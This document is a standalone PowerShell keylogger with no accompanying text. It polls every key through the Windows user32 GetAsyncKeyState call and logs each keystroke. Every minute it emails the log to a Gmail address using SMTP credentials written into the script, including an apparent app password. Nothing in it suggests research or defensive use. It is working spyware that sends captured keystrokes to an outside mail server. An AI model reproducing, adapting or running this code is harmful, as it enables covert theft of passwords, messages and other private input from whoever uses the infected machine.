
Add-Type -TypeDefinition @"  [DllImport("user32.dll")]
  public static extern short GetAsyncKeyState(int vKey);
"@ -Name Win32 -Namespace Native

$smtpServer='smtp.gmail.com';$smtpPort=587;$smtpUser='driiverr1@gmail.com';$smtpPass='gfpu dqgk wzfg sxgm';
$from='driiverr1@gmail.com';$to='driiverr1@gmail.com';
$global:Log='';

function Send-Log { if (-not $global:Log) { return } try {
  $msg=New-Object Net.Mail.MailMessage($from,$to,("Keylog "+(Get-Date)),$global:Log)
  $smtp=New-Object Net.Mail.SmtpClient($smtpServer,$smtpPort)
  $smtp.EnableSsl=$true;$smtp.Credentials=New-Object System.Net.NetworkCredential($smtpUser,$smtpPass)
  $smtp.Send($msg);$global:Log=''
} catch { Add-Content -Path "$env:TEMP\keylog-error.txt" -Value $_.Exception.Message } }

$timer=New-Object Timers.Timer(60 * 1000)
$timer.AutoReset=$true
$timer.add_Elapsed({ Send-Log })
$timer.Start()

while($true){
  for($v=1;$v -le 254;$v++){
    $st=[Native.Win32]::GetAsyncKeyState($v)
    if($st -band 0x8000){ $ch=[char]$v; switch($ch){' '{ $global:Log+=' '} '`r'{ $global:Log+='[ENTER]`n'} default{ $global:Log+=$ch} } }
  }
  Start-Sleep -Milliseconds 100
}
